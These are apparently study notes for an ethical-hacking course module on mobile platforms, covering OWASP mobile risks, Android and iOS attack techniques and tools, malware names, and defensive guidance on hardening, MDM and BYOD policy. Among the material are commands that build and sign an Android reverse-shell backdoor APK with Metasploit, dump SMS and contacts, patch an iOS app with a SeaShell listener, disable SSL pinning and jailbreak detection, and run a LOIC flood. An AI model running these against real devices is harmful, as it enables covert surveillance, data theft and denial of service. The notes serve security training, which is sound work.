# Module 17 – Hacking Mobile Platforms

> Status: ✅ Reference complete

## 1. Mobile platform attack vectors
Mobile security faces complex multi-vector attacks exploiting critical/financial data. Smartphones store sensitive corporate + personal data and connect over 3G/4G/5G, Wi-Fi, Bluetooth, and wired links — wide connectivity + the same risks as computers/networks/web apps make them prime targets (especially with BYOD).

### OWASP Top 10 Mobile Risks (2024)
- **M1 Improper Credential Usage** — hardcoded creds, unprotected storage, unencrypted transmission.
- **M2 Inadequate Supply Chain Security** — insecure third-party components, weak reviews, compromised signing keys → backdoors/DoS.
- **M3 Insecure Authentication/Authorization** — weak password rules, unsafe tokens, missing permission checks → impersonation.
- **M4 Insufficient Input/Output Validation** — SQLi, command injection, XSS → data access, code execution, crashes.
- **M5 Insecure Communication** — weak/outdated protocols, bad SSL certs → interception/account takeover.
- **M6 Inadequate Privacy Controls** — weak protection of PII (names, addresses, financials) → fraud/identity theft.
- **M7 Insufficient Binary Protections** — no anti-reverse-engineering/anti-tamper → fake apps, unlocked paid features.
- **M8 Security Misconfiguration** — weak encryption, insecure storage, unnecessary permissions, default creds.
- **M9 Insecure Data Storage** — plaintext/weak-encryption storage of credentials/PII/financials.
- **M10 Insufficient Cryptography** — weak algorithms, poor key management, flawed implementations.

### Anatomy of a mobile attack (entry points)
Attacks span **the device**, **the network**, and **the data center/cloud**.

**The device:**
- **Browser-based** — phishing (small screens hide URLs), framing (hidden iFrames), clickjacking, Man-in-the-Mobile (intercept SMS/call OTPs), buffer overflow, data caching.
- **Phone/SMS-based** — baseband attacks (GSM/3GPP baseband processor), SMiShing.
- **Application-based** — sensitive-data storage, no/weak encryption, improper SSL validation, configuration manipulation, dynamic runtime injection, unintended permissions, escalated privileges (+ UI overlay/pin stealing, third-party code, intent hijacking, zip directory traversal, clipboard data, URL schemes, GPS spoofing, weak local auth, repackaging, side-channel, unprotected signing key, app transport security, XML specialization).
- **The system (OS)** — no/weak passcode, iOS jailbreaking, Android rooting, OS data caching (reboot with malicious OS → dump memory), passwords/data in Keychain, carrier-loaded software, user-initiated code (+ confused deputy, TEE/secure enclave, side-channel leakage, media/file parsers, kernel driver vulns, resource DoS, GPS spoofing, device lockout).

**The network:** Wi-Fi (weak/no encryption), rogue access points, packet sniffing, MITM, session hijacking, DNS poisoning, SSLStrip (HTTPS→HTTP downgrade), fake SSL certificates (+ BGP hijacking, HTTP proxies).

**The data center/cloud** (two entry points — web server + database):
- **Web-server:** platform vulnerabilities, server misconfiguration, XSS, CSRF, weak input validation, brute force (+ CORS, side-channel, hypervisor, VPN).
- **Database:** SQL injection, privilege escalation, data dumping, OS command execution.

### How hackers profit
Access contacts/photos/emails/banking/business data; spy; steal financial credentials; impersonate on social media; use the device in a botnet → identity theft, fraud, data resale, large-scale campaigns.

### Mobile platform vulnerabilities
Malicious apps in stores, mobile malware, app-sandboxing vulns, weak device/app encryption, OS/app update issues, jailbreaking/rooting, app vulns, insufficient TLS, geolocation privacy, weak data security, excessive permissions, weak communication security, physical attacks, insufficient code obfuscation, insufficient session expiration.

### App stores & sandboxing
- **App stores** — attackers repackage genuine apps with malware → third-party stores; weak vetting + social engineering → data theft.
- **App sandboxing** — isolates an app from others/system resources; a weak sandbox lets attackers bypass isolation → access sensitive data.

### Mobile spam & SMiShing
Bulk unsolicited SMS/MMS/email/IM with ads, fake prizes, phishing, malicious links. **SMiShing** sends fake texts (lottery win, account suspension, voucher) with a malicious link/number → phishing site steals card numbers/PINs/PII. Effective because: high open rates, trust in SMS, limited space hides clues, low awareness, weak phone security, easy caller impersonation, urgency, direct links/downloads, shortened URLs, no anti-phishing filters.

### Bluetooth & other attacks
- **Pairing on open Bluetooth/Wi-Fi** → malware, data interception, malicious pairing, MITM.
- **Bluesnarfing** — steal data (contacts, messages, photos, files) over Bluetooth if discoverable.
- **Bluebugging** — take over the device (read/forward calls/messages, internet, contacts) silently.
- **Agent Smith** — malicious apps (from 9Apps etc.) replace real apps (WhatsApp/SHAREit) with infected versions → fraudulent ads + data theft.
- **SS7 exploitation** — SS7 signaling trusts operators without authentication; attacker performs MITM on texts/calls → eavesdrop bank creds/OTPs, **bypass 2FA + E2E encryption via SMS**. Threats: expose subscriber/network identity, intercept data, phone tapping, DoS, location tracking.
- **Simjacker** — exploits the **S@T browser** on SIM cards; a special SMS carries hidden commands the SIM executes silently → track location, monitor calls, collect IMEI, send premium SMS, redirect browser, disable SIM. Steps: attacker sends STK SMS → S@T browser processes hidden code → runs activities → accomplice device receives info via SMS.
- **Call spoofing** — fake caller ID (bank/government) → trick payments/info. Tools: SpoofCard (voice changing, background noise, voicemail, recording), Fake Call, SpoofTel, Fake Caller ID.

### OTP / 2FA hijacking
Intercept OTPs (SMS/email/authenticator) via stolen data, SIM-swap, or SIM-jacking malware → log in, reset passwords. **Via lock-screen notifications** — view OTP notifications on the lock screen (eavesdropping, borrowing the phone). Tools: AdvPhishing (bypass 2FA/OTP, NGrok tunneling), mrphish (bash, rooted/non-rooted).

### Camera/microphone capture
- **Camfecting** — RAT controls the webcam (disable the light), records/steals photos/videos/location. Steps: phishing link/site → malware install → remote access → capture.
- **Android camera hijack** — exploit security-bypass vulns in the default Google camera app (even when locked); needs permissions `android.permission.CAMERA`, `RECORD_AUDIO`, `ACCESS_COARSE/FINE_LOCATION` → capture photos/videos/calls, access stored media/GPS. Steps: trick into installing a malicious app → Trojan → persistent connection (survives app close).
- Tools: StormBreaker (location/webcam/mic without explicit permissions), CamPhish, HACK-CAMERA, CamOver, CAM-DUMPER.

## 2. Hacking Android OS

### Android OS
Google's mobile environment (OS + middleware + key apps) on the **Linux kernel**, open-source. Features: prebuilt UI components; storage options (Shared Preferences, Internal/External Storage, SQLite, network); RenderScript (native compute); rich APIs (Bluetooth/NFC/Wi-Fi P2P/USB/SIP); component reuse; **ART** runtime; Blink/WebKit browser; SQLite; media support; dev tools (emulator, debugger, profilers).

### Architecture (6 sections / 5 layers)
1. **System Apps** — pre-installed (dialer, email, calendar, camera, SMS, browser, contacts); mostly Java.
2. **Java API Framework** — Content Providers, View System, Activity Manager, Location Manager, Package Manager, Notification Manager, Resource Manager, Telephony Manager, Window Manager.
3. **Native C/C++ Libraries** — WebKit/Blink, OpenMAX AL, Libc, Media Framework, OpenGL ES, Surface Manager, SQLite, FreeType, SSL.
4. **Android Runtime (ART)** — AOT + JIT compilation, optimized GC, DEX files; core libraries.
5. **Hardware Abstraction Layer (HAL)** — exposes hardware (audio, camera, Bluetooth, sensors) to the framework.
6. **Linux Kernel** — device drivers (audio, binder/IPC, display, keypad, Bluetooth, camera, shared memory, USB, Wi-Fi, flash, power); memory/power/security/networking management.

### Device Administration API
Enforce security policies (enterprise MDM). Policies: password enabled, minimum length, alphanumeric/complex required, min letters/lowercase/uppercase/numeric/symbols/non-letters, password expiration timeout, history restriction, **maximum failed password attempts** (wipe after N), maximum inactivity time lock (1–60 min), require storage encryption, disable camera. Also: prompt new password, lock device immediately, **wipe data (factory reset)**. Used by email clients, remote-wipe security apps, device management services.

### Android rooting
Gain privileged **root access** by exploiting firmware vulnerabilities, placing the `su` binary in the system path (e.g. `/system/xbin/su`), making it executable. Enables: modify/delete system files/ROMs/kernels, remove bloatware, low-level hardware access, performance, Wi-Fi/Bluetooth tethering, install apps on SD, better UI. **Risks:** void warranty, poor performance, malware, bricking. Tools: One Click Root, KingoRoot, TunesGo, RootMaster, Magisk Manager, KingRoot, iRoot.
- **KingoRoot with PC:** install PC version → connect via USB → enable USB debugging → install drivers → click ROOT.
- **KingoRoot without PC:** enable unknown sources → download KingoRoot.apk → launch → "One Click Root".

### Hacking Android devices
Tools: drozer, zANTI, Network Spoofer, LOIC, DroidSheep, Orbot Proxy.

- **drozer** (attack-surface identification):
  ```
  dz> run app.package.list                           # all packages
  dz> run app.package.list -f <string_name>          # filter package name
  dz> run app.package.info -a <package_name>          # package details
  dz> run app.package.attacksurface <package_name>    # exported activities/services/receivers/providers
  dz> run app.activity.info -a <package_name>         # exported activity details
  dz> run app.activity.start <activity_name>          # launch activity (bypass auth)
  ```
- **Bypass FRP (4ukey/Octoplus):** launch 4uKey → "Remove Google Lock (FRP)" → select OS version → Start → follow prompts ("Always Allow From This Computer") → "Bypassed Google FRP Lock Successfully".
- **zANTI** — MAC spoof, malicious hotspot, port scan, router exploits, password audits, MITM/DoS, view/modify/redirect HTTP, HTTPS→HTTP redirect, inject HTML, session hijack, replace images, capture downloads.
- **Kali NetHunter** — HID keyboard injection, BadUSB, evil AP (MANA), Metasploit payloads.
- **LOIC** — HTTP/UDP/TCP flood DoS: install → enter target IP/URL → GET IP → select method → port + threads → START.
- **Orbot Proxy** — Tor proxy to hide the attacker's identity.
- **PhoneSploit Pro (ADB)** — exploits ADB with TCP debugging on port 5555 → remote command execution (screen capture, system info, port forward, install/remove apps, control Wi-Fi).
- **Man-in-the-Disk (MITD)** — target apps using unprotected external storage; monitor during updates, replace update files with malicious code → fraudulent app install → steal data / control mic/camera.
- **Spearphone** — exploit the accelerometer (no permission needed) to pick up loudspeaker vibrations → reconstruct conversations/voice-assistant audio.

- **Metasploit (exploit an Android device):**
  ```bash
  msf > search type:exploit platform:android
  msf > search type:payload platform:android
  msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<IP> R > Desktop/Backdoor.apk
  msf > use exploit/multi/handler
  msf > set PAYLOAD android/meterpreter/reverse_tcp
  msf > set LHOST <IP>
  msf > set LPORT <Port>
  msf > exploit
  # meterpreter: sysinfo, ipconfig, pwd, ps, dump_sms, dump_calllog, dump_contacts, webcam_list
  ```

### Analyzing Android devices (ADB)
```bash
# shell over Wi-Fi (same network, USB debugging on)
adb tcpip 5555
adb connect <device_ip>
adb devices
adb shell
# enumerate installed apps
adb shell pm list packages
adb shell pm list packages -3 -f        # third-party only
frida-ps -Uai                            # Frida: all installed apps on USB device
# disassemble an APK
apktool d <App_package>.apk
tree                                     # AndroidManifest.xml, META-INF, assets, classes.dex, lib, res, resources.arsc
# logs / files / connections
adb logcat > logcat.log
lsof -p <pid>
netstat -p | grep <pid>
# sign a malicious/repacked APK
keytool -genkey -v -keystore ~/.android/debug.keystore -alias signkey -keyalg RSA -keysize 2048 -validity 20000
apksigner sign --ks ~/.android/debug.keystore --ks-key-alias signkey <malicious>.apk
```

### Other Android techniques
- **Advanced SMS phishing** — exploit weak OTA provisioning auth; fake config messages redirect traffic/emails (needs IMSI, or a two-step fake-PIN message). Harmony Mobile detects it.
- **Bypass SSL pinning** — reverse engineering (Apktool decompile → find `checkClientTrusted`/`checkServerTrusted` X.509 handling → alter → `apktool b` recompile) or **hooking** (`frida -U -l <hook.js> -f <package>` to tamper runtime; also works for iOS).
- **Tap 'n Ghost** — exploit NFC + capacitive touchscreens: **TAP** (NFC tag emulator forces visiting a URL + device fingerprinting) + **Ghost Touch Generator** (fake touch events → trick "cancel" into "permit") → full control (also ATMs/voting machines).
- **Malware:** Mamont (banking Trojan as Chrome), SecuriDropper, Dwphon, DogeRAT, Tambir, SoumniBot.
- **Hacking tools:** AndroRAT (persistent backdoor, location/SIM/IP/MAC), Ghost Framework (ADB post-exploitation), mSpy, SET. **Sniffers:** PCAPdroid (VPN-based, no root), NetCapture, Intercepter-NG, Packet Capture, Sniffer Wicap 2.

### Securing & analyzing Android
- **Countermeasures:** screen lock; strong PIN/biometrics; never root; official stores only; antivirus; avoid direct APKs; update OS; app lockers; encryption; check permissions; GPS tracking; remote wipe (Find My Device); disable risky features; VPN; block ads; 2-step verification; avoid SmartLock; password managers; screen pinning; Google Play Protect; disable Bluetooth/NFC/USB debugging when idle; review logs.
- **Tools:** Kaspersky, Avira, Avast, McAfee, Lookout, Sophos Intercept X. **Tracking:** Google Find My Device (Play Sound / Secure Device / Factory Reset), Where's My Droid, Prey. **Vuln scanners:** Quixxi App Shield, ImmuniWeb MobileSuite, Yaazhini.
- **Static analysis:** **MobSF** (static+dynamic on APK/XAPK/APPX/IPA — permissions, activities, signer certs) at mobsf.live; online analyzers (Sixo, KOODOUS, Hybrid Analysis, DeGuard).

## 3. Hacking iOS

### Apple iOS
Apple's mobile OS (iPhone/iPad/iPod/Apple TV), not licensed for non-Apple hardware; touch-gesture UI. **Five layers:** Cocoa Application (AppKit, UI frameworks, multitasking/push/touch), Media (graphics/audio/video), Core Services (Core Foundation/Foundation, iCloud/location/networking), Core OS (low-level security/hardware/networking), Kernel & Device Drivers (kernel, BSD, file systems, networking).

### Jailbreaking
Modify the system kernel to bypass restrictions + gain root; install third-party apps/themes/tweaks, sideload — but removes sandboxing → vulnerable. Risks: void warranty, poor performance, malware, bricking. Tools: Hexxa Plus, Sileo, checkra1n, palera1n, Redensa, Zeon, Cydia.
- **Types:** **Userland exploit** (app loophole, user-level only, patched by firmware update), **iBoot exploit** (iBoot loophole, user + iboot-level, semi-tethered on new bootrom, firmware-patchable), **Bootrom exploit** (SecureROM loophole, disables signature checks, user + iboot-level, **only a hardware update** can patch).
- **Techniques:** **Untethered** (boots fully, kernel patched, no computer needed), **Semi-tethered** (boots fully but unpatched kernel; need the tool for jailbroken add-ons), **Tethered** (needs a computer to boot patched each time), **Semi-untethered** (reboots unpatched but an on-device app re-patches).

### Hacking iOS devices
- **Spyzie** — hack SMS/call logs/chats/GPS remotely, invisibly, without jailbreaking.
- **iOS Trustjacking** — abuse "iTunes Wi-Fi Sync": connect to a trusted-but-compromised computer → remote access over Wi-Fi even after disconnect → read messages/emails, backup/restore (SMS history, deleted photos), replace apps with malicious ones.
- **SeaShell Framework** (post-exploitation) — exploits the **CoreTrust** vulnerability; malicious IPA + TrollStore → TCP listener + encrypted session:
  ```bash
  seashell
  ipa patch Instagram.ipa              # patch IPA with IP + port
  listener on <IP> <Port>              # start listener
  devices -i <id>                      # interact (Pwny)
  safari_history                       # /var/mobile/Library/Safari/
  ```
- **Cycript** — runtime manipulation (JS interpreter understanding Objective-C) → bypass auth, disable jailbreak detection, modify methods live.
- **iOS Method Swizzling** — Objective-C runtime technique swapping method implementations → bypass auth, inject JS into WebViews, log actions. Steps: identify the selector → create a new method → run the app → swap via the Objective-C runtime.
- **Keychain Dumper** — extract the encrypted keychain (passwords/certs/keys); uses a self-signed cert with wildcard entitlement (recent iOS needs an explicit existing entitlement).
- **objection** (method hooking via Frida):
  ```bash
  objection --gadget <AppName> explore
  ios hooking watch class <Class_Name>
  ios hooking watch method "-[Class_Name Method_Name]"
  ios hooking set return_value "-[Class_Name iFunction_Name:]" true/false
  ios sslpinning disable
  ios jailbreak disable
  ```

### Analyzing iOS devices
```bash
# device shell (jailbroken; OpenSSH; same Wi-Fi) — default users root/mobile, password "alpine"
ssh root@<device_ip>
# over USB via usbmuxd/iproxy
ssh -p 2222 root@localhost          # USB Restricted Mode: <1h data connection when locked
frida-ps -Uai                        # list installed apps (note identifier + PID)
# network sniffing (macOS + USB)
rvictl -s <UDID>                     # create rvi0 interface → Wireshark on rvi0
ip.addr == 192.168.2.4 && http       # capture filter
# open connections
lsof -i
lsof -i -a -p <pid>
# process exploration (r2frida)
r2 frida://usb//iGoat-Swift
:dm        # memory maps
:il        # loaded binaries/libraries
\e~search  # in-memory search
```
- **Malware:** GoldPickaxe (MDM-profile abuse, face scan/ID theft), SpectralBlur, Mercenary Spyware, LightSpy, KingsPawn, Pegasus.
- **Hacking tools:** Elcomsoft Phone Breaker (iCloud/backup decryption, Keychain), Frida, iWepPRO.
- **Securing iOS:** passcode/Face ID/Touch ID; strong per-app passwords; keep iOS updated; avoid jailbreaking; secure Wi-Fi + VPN; careful with links/downloads; Find My iPhone + remote wipe; turn off unused services; 2FA on Apple ID; encrypt + disable iCloud backup for critical data. Tools: Malwarebytes, Norton, McAfee, Trend Micro. **Tracking:** Find My (Lost Mode), Glympse, Prey, FollowMee.

## 4. Mobile security guidelines

### OWASP Top 10 Mobile — key solutions
- **Improper Credential Usage** — no hardcoded creds; encrypt in transit; revocable access tokens; strong auth; rotate API keys.
- **Supply Chain** — secure coding/review/testing; secure signing/distribution; trusted third-party libs; secure update process; monitoring.
- **Insecure Auth/Authz** — avoid weak patterns; server-side auth; Face ID/Touch ID; validate roles/permissions; local integrity checks.
- **Input/Output Validation** — strict context-based validation; integrity checks; secure coding; regular assessments.
- **Insecure Communication** — SSL/TLS on transport; strong cipher suites; CA-signed certs; never accept bad certs; **certificate pinning**; SSL chain verification; verify endpoint; alert on invalid cert; no sensitive data over SMS/MMS; extra encryption layer. *iOS:* valid certs fail-closed, Secure Transport API, no `setAllowsAnyHTTPSCertificate`, pinning via `connection:willSendRequestForAuthenticationChallenge`. *Android:* remove `AllowAllHostnameVerifier`/`ALLOW_ALL_HOSTNAME_VERIFIER`, implement `checkServerTrusted`, don't override `onReceivedSslError`.
- **Privacy Controls** — minimize PII; auth/authz; static/dynamic leak detection.
- **Binary Protections** — obfuscation + anti-tamper; local + backend integrity checks on startup.
- **Security Misconfiguration** — secure defaults; no hardcoded default creds; restrictive file permissions; least-permission requests; no cleartext traffic + pinning; disable debugging/backup in production; export only necessary components.
- **Insecure Data Storage** — robust encryption; HTTPS/TLS; restricted-access storage; strong access controls.
- **Insufficient Cryptography** — strong algorithms + key length; secure key management (HSM/vaults); no custom crypto; SHA-256/bcrypt; salting; PBKDF2/bcrypt/scrypt KDFs.

### General & admin guidelines
- **Users:** limit apps; trusted sources; disable wireless when idle; strong passcode + auto-lock + wipe-after-failures; update OS/apps; remote management + wipe (MDM, Find My); no root/jailbreak; encrypt storage + backups; VPN on public Wi-Fi; anti-malware + MFA + strict permissions.
- **Administrators:** BYOD policy; cloud-usage policy; anti-virus/firewalls; app+data access rules; session timeouts; control password caching; mobile security policy; regular updates; restrict public Wi-Fi; endpoint + DLP + encryption.
- **SMiShing countermeasures:** don't reply to suspicious SMS; don't click SMS links; don't share PINs/passwords; know the bank's SMS policy; block internet-based texts; watch urgency/scare tactics; verify numbers via official sources; ignore fake prizes; watch poor grammar; anti-phishing apps + SMS filters + MFA.
- **OTP-hijacking countermeasures:** *users* — strong unique passwords, password manager, update software, SSL sites, SIM PIN lock, hide lock-screen notifications, avoid SMS-auth apps, minimize SMS/email recovery, never forward OTPs, enter manually. *developers* — secure channels + E2E encryption, combine OTP with biometric/hardware factors, rate-limit OTP requests, short expiry, behavioral analytics, HOTP/TOTP, unique non-reused OTPs, hardware OTP generators/security keys.

### Secure critical-data storage
- **Android KeyStore:** protect keys with pattern/PIN/password/fingerprint; hardware-backed KeyStore; encrypt data; authorize key creation; store master key separately; derive keys from user passphrase; encrypt SharedPreferences; least privilege; no hardcoded secrets; obfuscate; TLS; secure content providers.
- **iOS Keychain:** Touch ID/Face ID/passcode; hardware-backed 256-bit AES; ACLs; store only small data; `AccessControlFlags`; erase keychain on uninstall; encrypt app-extension shared data; secure IPC; vetted cloud storage.

### Reverse engineering mobile apps
Disassemble to study source/structure/behavior — find design flaws, hidden vulns, embedded secrets; malware analysis; compliance (GDPR/HIPAA); regenerate after modification. Effective for: vulnerability discovery, malware analysis, understanding comms protocols, black-box testing (bypass SSL/root detection/anti-tamper), static analysis (hardcoded passwords), resilience assessment, compliance/auditing, third-party component analysis.
- **Source-code analysis:** Syhunt Mobile (350+ Android / 240+ iOS checks, OWASP Mobile Top 10), Android lint, Appium, Infer.
- **Reverse engineering:** Apktool (decompile/rebuild APK, Smali debugging), Androguard, Frida, JEB, Bytecode Viewer.
- **Repackaging detectors:** Appdome (RASP, anti-tamper/reverse/hooking/repackaging), freeRASP, iXGuard, AndroCompare, FSquaDRA 2.
- **Protection:** Avast, Comodo, AVG, Norton, Bitdefender, ESET. **Anti-spyware:** TotalAV, Certo, Anti Spy. **Pen-test toolkits:** ImmuniWeb MobileSuite (SAST/DAST/IAST/SCA), Appknox, MobSF, Data Theorem.

## 5. Mobile Device Management (MDM) & BYOD

### MDM
Control + secure enterprise mobile devices (company-owned + BYOD). Distribute apps/data/settings OTA, enforce policies, monitor. **Features:** device passcode, remote lock, remote wipe, root/jailbreak detection, policy enforcement + inventory, real-time monitoring/reporting. Solutions: Scalefusion, ManageEngine MDM Plus, Microsoft Intune, SOTI MobiControl, AppTec360, Jamf Pro.

### BYOD
Employees use personal devices for work. **Benefits:** productivity, satisfaction, flexibility, lower costs. **Risks:** confidential data on unsecured networks, data leakage/endpoint issues, improper disposal, device diversity, mixing personal+company data, lost/stolen devices, lack of awareness, bypassing network policies, infrastructure gaps, disgruntled employees, jailbreak/root, inadequate backup, outdated software/patches, shadow IT/unauthorized cloud.

### BYOD policy implementation (5 principles)
1. **Define requirements** — segment employees (role/location/data access/mobility); assign technology; **Privacy Impact Assessment (PIA)** led by a mobile governance committee.
2. **Select devices / build portfolio** — secure devices, MDM/virtual desktops/on-device security, manage WLAN connectivity.
3. **Develop policies** — HR/legal/security/privacy involvement: infosec, data protection, confidentiality/ownership, tracking/monitoring, termination, Wi-Fi assessment, acceptable use.
4. **Security** — manage assets/identities/device health, storage, media, apps, network access, web/messaging security, DLP; assess information/operations/transmission security.
5. **Support** — establish support process/capabilities early; mobile committees reassess.

### BYOD security guidelines
- **Administrator:** secure data centers; educate employees; encrypted channels (HTTPS/VPN/SSL); restrict jailbroken/rooted devices; MFA; complex passcodes; remote wipe/lock; regular updates; application control (whitelist/blacklist); **data separation (containerization)**.
- **Employee:** encrypt data; separate work/personal; remote wipe/locate; keep updated; security software (AV/firewall/DLP); strong passcodes + biometrics; app passwords; download safely; data removal on exit; authorized repairs only; avoid personal cloud; no jailbreak/root; review app permissions; auto-lock; VPN for work; MFA; disable idle Bluetooth/Wi-Fi; **avoid public charging (juice-jacking)** — use a USB data blocker; secure backups; report lost/stolen devices immediately.

> Flow: pick the vector (device browser/app/OS, network MITM/rogue AP, or data-center web/DB), or SMS/SIM paths (SMiShing, SS7, Simjacker, OTP hijacking). Android: root → drozer/Metasploit/ADB/Frida for attack surface, payloads, and runtime hooking (SSL-pinning bypass). iOS: jailbreak (userland/iBoot/bootrom) → SeaShell/Cycript/objection/Keychain Dumper. Defend with no root/jailbreak, official stores, encryption + KeyStore/Keychain, certificate pinning, MFA, MDM + a real BYOD policy with containerization and remote wipe.
